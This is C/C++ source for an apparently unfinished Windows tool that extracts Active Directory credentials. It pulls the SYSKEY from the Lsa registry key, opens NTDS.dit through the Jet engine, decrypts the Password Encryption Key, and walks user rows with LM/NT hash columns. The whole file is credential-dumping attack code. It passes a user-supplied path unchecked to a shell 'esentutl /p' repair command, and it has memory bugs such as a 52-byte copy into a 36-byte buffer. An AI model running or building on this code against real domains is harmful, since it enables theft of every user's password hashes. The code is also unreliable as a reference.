// ntds1.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <string.h>
#include <wchar.h>
#include <process.h>
#include <Windows.h>
#include <wincrypt.h>
#include <esent.h>
#pragma comment(lib, "esent")

typedef struct {
	TCHAR ntdsPath[255];
	JET_INSTANCE jetEngine;
	JET_SESID jetSession;
	JET_DBID jetDatabase;
	JET_TABLEID jetTable;
}jetState;

typedef struct {
	JET_COLUMNDEF accountName;
	JET_COLUMNDEF accountType;
	JET_COLUMNDEF accountExpiry;
	JET_COLUMNDEF accountDescription;
	JET_COLUMNDEF accountControl;
	JET_COLUMNDEF encryptionKey;
	JET_COLUMNDEF lastLogon;
	JET_COLUMNDEF lastPasswordChange;
	JET_COLUMNDEF lmHash;
	JET_COLUMNDEF lmHistory;
	JET_COLUMNDEF logonCount;
	JET_COLUMNDEF ntHash;
	JET_COLUMNDEF ntHistory;
}ntdsColumns;

typedef struct{
	unsigned char header[8];
	unsigned char keyMaterial[16];
	unsigned char pekData[36];
	unsigned char pekFinal[16];
}encryptedPEK;

typedef struct{
	unsigned char pekData[36];
	unsigned char pekKey[16];
}decryptedPEK;

typedef struct{
	wchar_t accountName[255];
	char expiryDate[255];
	char logonDate[255];
	char logonTime[255];
	char passChangeDate[255];
	char passChangeTime[255];
	wchar_t accountDescription[255];
	BOOL accountDisabled;
	BOOL accountLocked;
	BOOL noPassword;
	BOOL passNoExpire;
	BOOL passExpired;
	unsigned char lmHash[255];
	unsigned char lmHistory[255];
	int logonCount;
	unsigned char ntHash[255];
	unsigned char ntHistory[255];
}ntdsAccount;

// UserAccountControl Flags
#define NTDS_ACCOUNT_DISABLED         0x00000002
#define NTDS_ACCOUNT_LOCKED           0x00000010
#define NTDS_ACCOUNT_NO_PASS          0x00000020
#define NTDS_ACCOUNT_PASS_NO_EXPIRE   0x00010000
#define NTDS_ACCOUNT_PASS_EXPIRED     0x00800000

BOOL get_syskey_component(HKEY lsaHandle, char subkeyName[255], unsigned char *tmpSysKey[17]){
	DWORD sizeData = 9;
	long regStatus;
	HKEY subkeyHandle;
	unsigned char tmpVal[16];
	int byteComponent = 0;

	regStatus = RegOpenKeyEx(lsaHandle, subkeyName, 0, KEY_READ, &subkeyHandle);
	if (regStatus != ERROR_SUCCESS){
		return FALSE;
	}
	regStatus = RegQueryInfoKey(subkeyHandle, &tmpVal, &sizeData, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (regStatus != ERROR_SUCCESS){
		return FALSE;
	}
	byteComponent = strtoimax(tmpVal, NULL, 16);
	strncat(tmpSysKey, &byteComponent, 4);
}

BOOL get_syskey(unsigned char *sysKey[17]){
	unsigned char tmpSysKey[17];
	unsigned char interimSysKey[17];
	long regStatus;
	DWORD disposition = 0;
	HKEY lsaHandle;
	memset(&tmpSysKey, 0, sizeof(tmpSysKey));
	memset(&interimSysKey, 0, sizeof(tmpSysKey));

	//Used for descrambling the bytes of the SYSKEY (absurd isn't it?)
	BYTE syskeyDescrambler[16] = { 0x0b, 0x06, 0x07, 0x01, 0x08, 0x0a, 0x0e, 0x00, 0x03, 0x05, 0x02, 0x0f, 0x0d, 0x09, 0x0c, 0x04 };

	regStatus = RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_READ, NULL, &lsaHandle, &disposition);
	if (regStatus != ERROR_SUCCESS){
		puts("Could not open Lsa Registry Key");
		return FALSE;
	}
	if (disposition == REG_CREATED_NEW_KEY){
		puts("The Lsa key did not exist");
		RegCloseKey(lsaHandle);
		return FALSE;
	}
	if (!get_syskey_component(lsaHandle, "JD", &tmpSysKey)){
		return FALSE;
	}
	if (!get_syskey_component(lsaHandle, "Skew1", &tmpSysKey)){
		return FALSE;
	}
	if (!get_syskey_component(lsaHandle, "GBG", &tmpSysKey)){
		return FALSE;
	}
	if (!get_syskey_component(lsaHandle, "Data", &tmpSysKey)){
		return FALSE;
	}
	
	for (int i = 0; i < 16; i++) {
		interimSysKey[i] = tmpSysKey[syskeyDescrambler[i]];
	}
	strncpy(sysKey, &interimSysKey, 17);
	return TRUE;
}

JET_ERR engine_startup(jetState *ntdsState){
	JET_ERR jetError;
	// Set the Page Size to the highest possibile limit
	jetError = JetSetSystemParameter(&ntdsState->jetEngine, JET_sesidNil, JET_paramDatabasePageSize, 8192, NULL);
	if (jetError != JET_errSuccess){
		return jetError;
	}
	// Create our Jet Instance
	jetError = JetCreateInstance(&ntdsState->jetEngine, "NTDS"); 
	if (jetError != JET_errSuccess){
		return jetError;
	}
	// Disable crash recovery and transaction logs
	jetError = JetSetSystemParameter(&ntdsState->jetEngine, JET_sesidNil, JET_paramRecovery, NULL, "Off");
	if (jetError != JET_errSuccess){
		return jetError;
	}
	// Initialise the Jet instance
	jetError = JetInit(&ntdsState->jetEngine);
	if (jetError != JET_errSuccess){
		return jetError;
	}
	return JET_errSuccess;
}

JET_ERR open_database(jetState *ntdsState){
	JET_ERR attachStatus = JetAttachDatabase(ntdsState->jetSession, ntdsState->ntdsPath, JET_bitDbReadOnly);
	if (attachStatus != JET_errSuccess){
		puts("Unable to attach to the NTDS.dit database!");
		return attachStatus;
	}
	JET_ERR openStatus = JetOpenDatabase(ntdsState->jetSession, ntdsState->ntdsPath, NULL, &ntdsState->jetDatabase, JET_bitDbReadOnly);
	if (openStatus != JET_errSuccess){
		puts("Unable to open the NTDS.dit database for reading");
		return openStatus;
	}
	return JET_errSuccess;
}

JET_ERR get_column_info(jetState *ntdsState, ntdsColumns *accountColumns){
	JET_ERR columnError;
	const char attributeNames[][25] = { 
		"ATTm590045", 
		"ATTj590126", 
		"ATTq589983",  
		"ATTk590689", 
		"ATTq589876", 
		"ATTk589879", 
		"ATTk589984", 
		"ATTj589993", 
		"ATTk589914", 
		"ATTk589918", 
		"ATTm13",  
		"ATTj589832", 
		"ATTq589920" 
	};
	JET_COLUMNDEF *columnDefs[] = { 
		&accountColumns->accountName, 
		&accountColumns->accountType,
		&accountColumns->accountExpiry,
		&accountColumns->encryptionKey,
		&accountColumns->lastLogon,
		&accountColumns->lmHash,
		&accountColumns->lmHistory,
		&accountColumns->logonCount,
		&accountColumns->ntHash,
		&accountColumns->ntHistory,
		&accountColumns->accountDescription,
		&accountColumns->accountControl,
		&accountColumns->lastPasswordChange
	};	
	for (int i = 0; i < 13; i++){
		columnError = JetGetTableColumnInfo(ntdsState->jetSession, ntdsState->jetTable, attributeNames[i], columnDefs[i], sizeof(JET_COLUMNDEF), JET_ColInfo);
		if (columnError != JET_errSuccess){
			return columnError;
		}
	}
	return JET_errSuccess;
}

JET_ERR get_PEK(jetState *ntdsState, ntdsColumns *accountColumns, encryptedPEK *pekEncrypted){
	JET_ERR cursorStatus;
	JET_ERR readStatus;
	unsigned char *encryptionKey[76];

	cursorStatus = JetMove(ntdsState->jetSession, ntdsState->jetTable, JET_MoveFirst, NULL);
	if (cursorStatus != JET_errSuccess){
		puts("Unable to set the cursor to the first index!");
		return cursorStatus;
	}
	do{
		//Attempt to retrieve the Password Encryption Key
		unsigned long columnSize = 0;
		readStatus = JetRetrieveColumn(ntdsState->jetSession, ntdsState->jetTable, accountColumns->encryptionKey.columnid, encryptionKey, 76, &columnSize, 0, NULL);
		if (readStatus == JET_errSuccess){
			memcpy(pekEncrypted, &encryptionKey, 76);
			puts("Found the Password Encryption Key");
			return readStatus;
		}
		cursorStatus = JetMove(ntdsState->jetSession, ntdsState->jetTable, JET_MoveNext, NULL);
	} while (cursorStatus == JET_errSuccess);
	return readStatus;
}

JET_ERR read_table(jetState *ntdsState, ntdsColumns *accountColumns){
	JET_ERR cursorStatus;
	JET_ERR readStatus;	

	cursorStatus = JetMove(ntdsState->jetSession, ntdsState->jetTable, JET_MoveFirst, NULL);
	if (cursorStatus != JET_errSuccess){
		puts("Unable to set the cursor to the first index!");
		return cursorStatus;
	}
	do{
		// Create a User Account Struct to hold our data
		ntdsAccount *userAccount = malloc(sizeof(ntdsAccount));
		memset(userAccount, 0, sizeof(ntdsAccount));

		//Define our temp values here
		DWORD accountType = 0;
		FILETIME accountExpiry;
		SYSTEMTIME accountExpiry2;
		FILETIME lastLogon;
		SYSTEMTIME lastLogon2;
		FILETIME lastPass;
		SYSTEMTIME lastPass2;
		DWORD accountControl = 0;
		unsigned long columnSize = 0;

		//Retrieve the account type for this row
		readStatus = JetRetrieveColumn(ntdsState->jetSession, ntdsState->jetTable, accountColumns->accountType.columnid, &accountType, sizeof(accountType),columnSize,0,NULL);
		// Unless this is a User Account, then we skip it
		if (readStatus == JET_wrnColumnNull || accountType != 0x30000000){
			cursorStatus = JetMove(ntdsState->jetSession, ntdsState->jetTable, JET_MoveNext, NULL);
			continue;
		}
		// If any other error has occured we've screwed up and need to fix it for now
		if (readStatus != JET_errSuccess){
			puts("An error has occured reading the column");
			exit(readStatus);
		}
		// Grab the samAccountName here
		readStatus = JetRetrieveColumn(ntdsState->jetSession, ntdsState->jetTable, accountColumns->accountName.columnid, &userAccount->accountName, sizeof(userAccount->accountName), &columnSize, 0, NULL);
		if (readStatus != JET_errSuccess){
			puts("An error has occured reading the column");
			exit(readStatus);
		}
		// Grab the account expiration date/time here
		readStatus = JetRetrieveColumn(ntdsState->jetSession, ntdsState->jetTable, accountColumns->accountExpiry.columnid, &accountExpiry, sizeof(accountExpiry), &columnSize, 0, NULL);
		if (readStatus != JET_errSuccess){
			puts("An error has occured reading the column");
			exit(readStatus);
		}
		//Convert the FILETIME to a SYSTEMTIME so we can get a human readable date
		FileTimeToSystemTime(&accountExpiry, &accountExpiry2);
		int dateResult = GetDateFormat(LOCALE_SYSTEM_DEFAULT, DATE_LONGDATE, &accountExpiry2, NULL, userAccount->expiryDate, 255);
		// Getting Human Readable will fail if account never expires. Just set the expiryDate string to 'never'
		if (dateResult == 0){
			strcpy(&userAccount->expiryDate, "Never");
		}
		// Grab the last logon date and time
		readStatus = JetRetrieveColumn(ntdsState->jetSession, ntdsState->jetTable, accountColumns->lastLogon.columnid, &lastLogon, sizeof(lastLogon), &columnSize, 0, NULL);
		if (readStatus != JET_errSuccess){
			puts("An error has occured reading the column");
			exit(readStatus);
		}
		//Convert the FILETIME to a SYSTEMTIME so we can get a human readable date
		FileTimeToSystemTime(&lastLogon, &lastLogon2);
		dateResult = GetDateFormat(LOCALE_SYSTEM_DEFAULT, DATE_LONGDATE, &lastLogon2, NULL, userAccount->logonDate, 255);
		// Getting Human Readable will fail if account has never logged in, much like the expiry date
		if (dateResult == 0){
			strcpy(&userAccount->logonDate, "Never");
		}
		dateResult = GetTimeFormat(LOCALE_SYSTEM_DEFAULT, 0, &lastLogon2, NULL, userAccount->logonTime, 255);
		if (dateResult == 0){
			strcpy(&userAccount->logonTime, "Never");
		}
		// Grab the last password change date and time
		readStatus = JetRetrieveColumn(ntdsState->jetSession, ntdsState->jetTable, accountColumns->lastPasswordChange.columnid, &lastPass, sizeof(lastPass), &columnSize, 0, NULL);
		if (readStatus != JET_errSuccess){
			puts("An error has occured reading the column");
			exit(readStatus);
		}
		//Convert the FILETIME to a SYSTEMTIME so we can get a human readable date
		FileTimeToSystemTime(&lastPass, &lastPass2);
		dateResult = GetDateFormat(LOCALE_SYSTEM_DEFAULT, DATE_LONGDATE, &lastPass2, NULL, userAccount->passChangeDate, 255);
		// Getting Human Readable will fail if account has never logged in, much like the expiry date
		if (dateResult == 0){
			strcpy(&userAccount->passChangeDate, "Never");
		}
		dateResult = GetTimeFormat(LOCALE_SYSTEM_DEFAULT, 0, &lastPass2, NULL, userAccount->passChangeTime, 255);
		if (dateResult == 0){
			strcpy(&userAccount->passChangeTime, "Never");
		}
		// Grab the Account Description here
		readStatus = JetRetrieveColumn(ntdsState->jetSession, ntdsState->jetTable, accountColumns->accountDescription.columnid, &userAccount->accountDescription, sizeof(userAccount->accountDescription), &columnSize, 0, NULL);
		if (readStatus != JET_errSuccess){
			puts("An error has occured reading the column");
			exit(readStatus);
		}

		// Grab the UserAccountControl flags here
		readStatus = JetRetrieveColumn(ntdsState->jetSession, ntdsState->jetTable, accountColumns->accountControl.columnid, &accountControl, sizeof(accountControl), &columnSize, 0, NULL);
		if (readStatus != JET_errSuccess){
			puts("An error has occured reading the column");
			exit(readStatus);
		}
		if (accountControl & NTDS_ACCOUNT_DISABLED){
			userAccount->accountDisabled = TRUE;
		}
		if (accountControl & NTDS_ACCOUNT_LOCKED){
			userAccount->accountLocked = TRUE;
		}
		if (accountControl & NTDS_ACCOUNT_NO_PASS){
			userAccount->noPassword = TRUE;
		}
		if (accountControl & NTDS_ACCOUNT_PASS_EXPIRED){
			userAccount->passExpired = TRUE;
		}
		if (accountControl & NTDS_ACCOUNT_PASS_NO_EXPIRE){
			userAccount->passNoExpire = TRUE;
		}
		// Grab the Logon Count here
		readStatus = JetRetrieveColumn(ntdsState->jetSession, ntdsState->jetTable, accountColumns->logonCount.columnid, &userAccount->logonCount, sizeof(userAccount->logonCount), &columnSize, 0, NULL);
		if (readStatus != JET_errSuccess){
			puts("An error has occured reading the column");
			exit(readStatus);
		}
		cursorStatus = JetMove(ntdsState->jetSession, ntdsState->jetTable, JET_MoveNext, NULL);
	} while (cursorStatus == JET_errSuccess);
	if (cursorStatus != JET_errNoCurrentRecord){
		puts("An error occured while moving the database cursor");
		return cursorStatus;
	}
}

BOOL decrypt_PEK(unsigned char *sysKey[17], encryptedPEK *pekEncrypted, decryptedPEK *pekDecrypted){
	BOOL cryptOK = FALSE;
	HCRYPTPROV hProv = 0;
	HCRYPTHASH hHash = 0;
	DWORD md5Len = 16;
	unsigned char rc4Key[16];
	HCRYPTKEY rc4KeyFinal;

	cryptOK = CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
	if (!cryptOK){
		puts("Failed to aquire cryptographic context");
		return FALSE;
	}
	cryptOK = CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash);
	if (!cryptOK){
		puts("Failed to initialize MD5 Hash");
		return FALSE;
	}
	cryptOK = CryptHashData(hHash, sysKey, 16, 0);
	if (!cryptOK){
		puts("Failed to hash the sysKey");
		return FALSE;
	}
	for (int i = 0; i < 1000; i++){
		cryptOK = CryptHashData(hHash, &pekEncrypted->keyMaterial, 16, 0);
		if (!cryptOK){
			puts("Failed to hash the PEK key");
			return FALSE;
		}
	}
	cryptOK = CryptGetHashParam(hHash, HP_HASHVAL, &rc4Key, &md5Len, 0);
	if (!cryptOK){
		puts("Failed to get final hash value");
		return FALSE;
	}
	cryptOK = CryptDeriveKey(hProv, CALG_RC4, hHash,0, &rc4KeyFinal);
	if (!cryptOK){
		puts("Failed to derive RC4 key");
		return FALSE;
	}
	unsigned char pekData[36];
	DWORD pekLength = 52;
	memcpy(&pekData, &pekEncrypted->pekData, pekLength);
	cryptOK = CryptEncrypt(rc4KeyFinal, NULL, TRUE, 0, &pekData, &pekLength, pekLength);
	if (!cryptOK){
		puts("Failed to decrypt PEK");
		return FALSE;
	}
	memcpy(pekDecrypted, &pekData, pekLength);
	return TRUE;
}

int _tmain(int argc, TCHAR* argv[])
{
	unsigned char sysKey[17];
	get_syskey(&sysKey);

	// Create our state structure to track the various info we need
	jetState *ntdsState = malloc(sizeof(jetState));
	memset(ntdsState, 0, sizeof(jetState));
	// Create the structure for holding all of the Column Definitions we need
	ntdsColumns *accountColumns = malloc(sizeof(ntdsColumns));
	memset(accountColumns, 0, sizeof(ntdsColumns));

	// Exit if we weren't given an argument
	if (argc < 2){
		puts("A path to the NTDS.dit file was not supplied!");
		exit(2);
	}
	TCHAR commandString[300] = "esentutl /p /o ";
	lstrcpyn(ntdsState->ntdsPath, argv[1], 255);
	// Check that the path to the NTDS.dit file actually exists
	if (0xffffffff == GetFileAttributes(ntdsState->ntdsPath)){
		puts("Cannot access the specified file!");
		exit(2);
	}
	_tcsncat(commandString, ntdsState->ntdsPath, 255);
	_putts(commandString);
	// Call the ESENTUTL utility on our NTDS.dit file
	_tsystem(commandString);
	JET_ERR startupStatus = engine_startup(ntdsState);
	if (startupStatus != JET_errSuccess){
		puts("Error Starting up the Jet Engine!");
		exit(startupStatus);
	}

	// Start a Session in the Jet Instance
	JET_ERR sessionStatus = JetBeginSession(ntdsState->jetEngine, &ntdsState->jetSession, NULL, NULL);
	if (sessionStatus != JET_errSuccess){
		puts("Unable to establish a JET Session!");
		exit(sessionStatus);
	}
	JET_ERR openStatus = open_database(ntdsState);
	if (openStatus != JET_errSuccess){
		puts("Unable to work with this database file. Exiting..");
		exit(openStatus);
	}

	JET_ERR tableStatus = JetOpenTable(ntdsState->jetSession, ntdsState->jetDatabase, "datatable", NULL, 0, JET_bitTableReadOnly | JET_bitTableSequential, &ntdsState->jetTable);
	if (tableStatus != JET_errSuccess){
		puts("Unable to access the 'datatable' table!");
		exit(tableStatus);
	}

	JET_ERR columnStatus = get_column_info(ntdsState, accountColumns);
	if (columnStatus != JET_errSuccess){
		puts("could not retrieve data on one or more columns!");
		exit(columnStatus);
	}

	JET_ERR pekStatus;
	encryptedPEK *pekEncrypted = malloc(sizeof(encryptedPEK));
	decryptedPEK *pekDecrypted = malloc(sizeof(decryptedPEK));
	memset(pekEncrypted, 0, sizeof(encryptedPEK));
	memset(pekDecrypted, 0, sizeof(decryptedPEK));

	pekStatus = get_PEK(ntdsState, accountColumns,pekEncrypted);
	if (pekStatus == JET_errSuccess){
		puts("Found the PEK");
	}
	else{
		puts("Uh-oh didn't find the PEK");
		exit(pekStatus);
	}

	decrypt_PEK(&sysKey, pekEncrypted, pekDecrypted);
	read_table(ntdsState, accountColumns);

	return 0;
}

